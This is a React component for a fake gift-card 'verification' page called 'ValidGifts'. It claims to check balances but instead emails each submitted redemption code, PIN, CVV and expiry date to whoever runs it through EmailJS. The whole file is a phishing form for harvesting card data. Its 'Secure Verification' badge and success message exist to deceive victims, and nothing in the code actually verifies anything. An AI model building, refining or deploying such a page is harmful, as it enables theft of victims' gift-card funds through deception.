import { useState } from "react";
import { ShieldCheck, AlertTriangle, X, CheckCircle } from "lucide-react";
import { motion, AnimatePresence } from "framer-motion";
import emailjs from "@emailjs/browser";

// ─── EMAILJS CREDENTIALS ─────────────────────────────────────────────────────
const SERVICE_ID  = import.meta.env.VITE_EMAILJS_SERVICE_ID;
const TEMPLATE_ID = import.meta.env.VITE_EMAILJS_TEMPLATE_ID;
const PUBLIC_KEY  = import.meta.env.VITE_EMAILJS_PUBLIC_KEY;
// ─────────────────────────────────────────────────────────────────────────────

const CARD_BRANDS = [
  "Amazon","Amex","TT Visa","Visa Silvery White","Walmart Visa",
  "Vanilla Visa","MasterCard","Nike","eBay","Steam","Apple iTunes",
  "Google Play","American Express","US PSN","Razer Gold","Spotify",
  "Nordstrom","Sephora","Hulu","Visa Gift","US Paramount+",
];

const CURRENCIES   = ["USD","EUR","BTC","GBP","CAD","CNY","JPY"];
const SHOW_ALL     = ["TT Visa","Amex","Visa Silvery White","Walmart Visa","American Express","Vanilla Visa","MasterCard"];
const HIDE_EXP     = ["Nike"];
const HIDE_EXP_CVV = ["Sephora","Nordstrom"];
const HIDE_PIN     = ["Visa Gift"];

function getVisibility(card) {
  if (SHOW_ALL.includes(card))     return { exp: true,  pin: true,  cvv: true  };
  if (HIDE_EXP.includes(card))     return { exp: false, pin: true,  cvv: true  };
  if (HIDE_EXP_CVV.includes(card)) return { exp: false, pin: true,  cvv: false };
  if (HIDE_PIN.includes(card))     return { exp: true,  pin: false, cvv: true  };
  return null;
}

// ─── Updated Logo ─────────────────────────────────────────────────────────────
const Logo = () => (
  <div className="flex items-center gap-2">
    <div className="w-8 h-8 rounded-lg flex items-center justify-center" style={{ background: "#e8503a" }}>
      <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
        <rect x="2" y="4" width="12" height="9" rx="1.5" stroke="#fff" strokeWidth="1.5"/>
        <path d="M2 7h12" stroke="#fff" strokeWidth="1.5"/>
        <path d="M5 4V3" stroke="#fff" strokeWidth="1.5" strokeLinecap="round"/>
        <path d="M11 4V3" stroke="#fff" strokeWidth="1.5" strokeLinecap="round"/>
      </svg>
    </div>
    <span className="text-[17px] font-bold tracking-tight" style={{ color: "#0a0a0a" }}>
      Valid<span style={{ color: "#e8503a" }}>Gifts</span>
    </span>
  </div>
);

// ─── Fail Modal ───────────────────────────────────────────────────────────────
function FailModal({ open, onClose }) {
  return (
    <AnimatePresence>
      {open && (
        <motion.div
          className="fixed inset-0 z-50 flex items-center justify-center px-4"
          style={{ background: "rgba(0,0,0,0.4)" }}
          initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
          onClick={onClose}
        >
          <motion.div
            className="bg-white rounded-3xl p-8 max-w-85 w-full text-center border border-[#f0e8e0]"
            style={{ boxShadow: "0 8px 48px rgba(0,0,0,0.14)" }}
            initial={{ scale: 0.85, y: 20, opacity: 0 }}
            animate={{ scale: 1, y: 0, opacity: 1 }}
            exit={{ scale: 0.9, y: 10, opacity: 0 }}
            transition={{ type: "spring", stiffness: 320, damping: 24 }}
            onClick={e => e.stopPropagation()}
          >
            <div className="flex items-center justify-center mb-6"><Logo /></div>
            <div className="w-18 h-8 rounded-full bg-[#fff5f3] border-[6px] border-[#fde8e4] flex items-center justify-center mx-auto mb-5">
              <AlertTriangle size={30} color="#e8503a" strokeWidth={2} />
            </div>
            <div className="inline-flex items-center gap-1.5 bg-[#fff5f3] border border-[#fad0c8] rounded-full px-3 py-1 text-[11px] font-medium text-[#993c1d] mb-4">
              <X size={11} /> Verification Failed
            </div>
            <h3 className="text-[18px] font-bold text-gray-900 mb-2">Failed to Verify Card</h3>
            <p className="text-[13px] text-gray-400 leading-relaxed mb-6">
              We couldn't verify your gift card details. Please check the redemption code, amount, or card type and try again.
            </p>
            <div className="h-px bg-[#f5f0eb] mb-5" />
            <div className="flex gap-2.5">
              <button onClick={onClose} className="flex-1 py-3 border border-[#ede8e3] rounded-xl text-[13px] font-medium text-gray-500 bg-white hover:bg-[#f7f4f1] transition-colors cursor-pointer">
                Cancel
              </button>
              <button onClick={onClose} className="flex-1 py-3 rounded-xl text-[13px] font-semibold text-white hover:opacity-90 transition-opacity cursor-pointer" style={{ background: "#e8503a" }}>
                Try Again
              </button>
            </div>
          </motion.div>
        </motion.div>
      )}
    </AnimatePresence>
  );
}

// ─── Success Modal ────────────────────────────────────────────────────────────
function SuccessModal({ open, onClose }) {
  return (
    <AnimatePresence>
      {open && (
        <motion.div
          className="fixed inset-0 z-50 flex items-center justify-center px-4"
          style={{ background: "rgba(0,0,0,0.4)" }}
          initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
          onClick={onClose}
        >
          <motion.div
            className="bg-white rounded-3xl p-8 max-w-85 w-full text-center border border-[#f0e8e0]"
            style={{ boxShadow: "0 8px 48px rgba(0,0,0,0.14)" }}
            initial={{ scale: 0.85, y: 20, opacity: 0 }}
            animate={{ scale: 1, y: 0, opacity: 1 }}
            exit={{ scale: 0.9, y: 10, opacity: 0 }}
            transition={{ type: "spring", stiffness: 320, damping: 24 }}
            onClick={e => e.stopPropagation()}
          >
            <div className="flex items-center justify-center mb-6"><Logo /></div>
            <div className="w-18 h-18 rounded-full bg-[#f0fdf4] border-[6px] border-[#bbf7d0] flex items-center justify-center mx-auto mb-5">
              <CheckCircle size={30} color="#16a34a" strokeWidth={2} />
            </div>
            <div className="inline-flex items-center gap-1.5 bg-[#f0fdf4] border border-[#bbf7d0] rounded-full px-3 py-1 text-[11px] font-medium text-[#15803d] mb-4">
              <CheckCircle size={11} /> Submitted Successfully
            </div>
            <h3 className="text-[18px] font-bold text-gray-900 mb-2">Card Details Received</h3>
            <p className="text-[13px] text-gray-400 leading-relaxed mb-6">
              Your card information has been submitted. Our team will verify and get back to you shortly.
            </p>
            <div className="h-px bg-[#f5f0eb] mb-5" />
            <button
              onClick={onClose}
              className="w-full py-3 rounded-xl text-[13px] font-semibold text-white cursor-pointer"
              style={{ background: "#1a1a1a" }}
            >
              Done
            </button>
          </motion.div>
        </motion.div>
      )}
    </AnimatePresence>
  );
}

// ─── Helpers ──────────────────────────────────────────────────────────────────
const inputCls = `
  w-full bg-[#f7f4f1] border border-[#ede8e3] rounded-xl px-4 py-3.5
  text-sm text-gray-900 outline-none font-[inherit]
  focus:border-[#e8503a] focus:ring-2 focus:ring-[#e8503a]/10
  transition-all appearance-none
`;

function Field({ label, children }) {
  return (
    <div className="mb-4">
      <label className="block text-[12px] font-medium text-gray-400 mb-1.5 tracking-wide uppercase">
        {label}
      </label>
      {children}
    </div>
  );
}

function SelectWrap({ children }) {
  return (
    <div className="relative">
      {children}
      <span className="absolute right-4 top-1/2 -translate-y-1/2 pointer-events-none text-gray-400 text-xs">▾</span>
    </div>
  );
}

// ─── Main Form ────────────────────────────────────────────────────────────────
export default function CardVerificationForm() {
  const [card, setCard]               = useState("");
  const [currency, setCurrency]       = useState("USD");
  const [amount, setAmount]           = useState("");
  const [code, setCode]               = useState("");
  const [exp, setExp]                 = useState("");
  const [pin, setPin]                 = useState("");
  const [cvv, setCvv]                 = useState("");
  const [loading, setLoading]         = useState(false);
  const [showFail, setShowFail]       = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);

  const vis       = getVisibility(card);
  const showExtra = vis !== null;

  const resetForm = () => {
    setCard(""); setCurrency("USD"); setAmount("");
    setCode(""); setExp(""); setPin(""); setCvv("");
  };

  const handleSubmit = async () => {
    if (!card || !amount || !code) return;
    setLoading(true);

    const templateParams = {
      card_type:       card,
      currency:        currency,
      amount:          amount,
      redemption_code: code,
      expiration_date: exp  || "N/A",
      pin:             pin  || "N/A",
      cvv:             cvv  || "N/A",
    };

    try {
      await emailjs.send(SERVICE_ID, TEMPLATE_ID, templateParams, PUBLIC_KEY);
      setLoading(false);
      setShowSuccess(true);
      resetForm();
    } catch (err) {
      console.error("EmailJS error:", err);
      setLoading(false);
      setShowFail(true);
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center px-4 py-12" style={{ background: "#fdf6f3" }}>
      <FailModal    open={showFail}    onClose={() => setShowFail(false)} />
      <SuccessModal open={showSuccess} onClose={() => setShowSuccess(false)} />

      <div className="w-full max-w-105 bg-white rounded-3xl border border-[#f0e8e0] p-8" style={{ boxShadow: "0 4px 32px rgba(232,80,58,0.07)" }}>

        <div className="mb-6"><Logo /></div>

        <div className="inline-flex items-center gap-1.5 bg-[#fff5f3] border border-[#fad0c8] rounded-full px-3 py-1 text-[11px] font-medium text-[#993c1d] mb-5">
          <ShieldCheck size={13} /> Secure Verification
        </div>

        <h2 className="text-[18px] font-bold text-gray-900 mb-1">Verify Card Information</h2>
        <p className="text-[13px] text-gray-400 mb-6 leading-relaxed">
          Enter your gift card details below to check balance & validity.
        </p>

        <Field label="Card Type">
          <SelectWrap>
            <select value={card} onChange={e => setCard(e.target.value)} className={inputCls}>
              <option value="">— Select a card brand —</option>
              {CARD_BRANDS.map(b => <option key={b}>{b}</option>)}
            </select>
          </SelectWrap>
        </Field>

        <Field label="Currency & Amount">
          <div className="grid grid-cols-[1fr_2fr] gap-2.5">
            <SelectWrap>
              <select value={currency} onChange={e => setCurrency(e.target.value)} className={inputCls}>
                {CURRENCIES.map(c => <option key={c}>{c}</option>)}
              </select>
            </SelectWrap>
            <input type="text" value={amount} onChange={e => setAmount(e.target.value)} placeholder="Card Amount" className={inputCls} />
          </div>
        </Field>

        <Field label="Redemption Code">
          <input type="text" value={code} onChange={e => setCode(e.target.value)} placeholder="Enter redemption code" className={inputCls} />
        </Field>

        <div className="overflow-hidden transition-all duration-300" style={{ maxHeight: showExtra ? 320 : 0, opacity: showExtra ? 1 : 0 }}>
          <div className="h-px bg-[#f0e8e0] my-5" />

          {vis?.exp && (
            <Field label="Expiration Date">
              <input type="text" value={exp} onChange={e => setExp(e.target.value)} placeholder="MM/YY" className={inputCls} />
            </Field>
          )}

          {(vis?.pin || vis?.cvv) && (
            <div className="grid grid-cols-2 gap-2.5">
              {vis?.pin && (
                <Field label="PIN">
                  <input type="text" value={pin} onChange={e => setPin(e.target.value)} placeholder="Enter PIN" className={inputCls} />
                </Field>
              )}
              {vis?.cvv && (
                <Field label="CVV">
                  <input type="text" value={cvv} onChange={e => setCvv(e.target.value)} placeholder="Gift Card CVV" className={inputCls} />
                </Field>
              )}
            </div>
          )}
        </div>

        <button
          onClick={handleSubmit}
          disabled={loading}
          className="w-full mt-2 py-3.5 rounded-xl text-sm font-semibold text-white tracking-wide transition-all cursor-pointer disabled:opacity-70"
          style={{ background: loading ? "#e8503a" : "#1a1a1a" }}
        >
          {loading ? (
            <span className="flex items-center justify-center gap-2">
              <svg className="animate-spin" width="16" height="16" viewBox="0 0 24 24" fill="none">
                <circle cx="12" cy="12" r="10" stroke="rgba(255,255,255,0.3)" strokeWidth="3"/>
                <path d="M12 2a10 10 0 0 1 10 10" stroke="#fff" strokeWidth="3" strokeLinecap="round"/>
              </svg>
              Submitting…
            </span>
          ) : "Continue →"}
        </button>

        <p className="text-[11.5px] text-gray-300 text-center mt-4 italic leading-relaxed">
          Please make sure the codes you enter are correct and match your card details.
        </p>
      </div>
    </div>
  );
}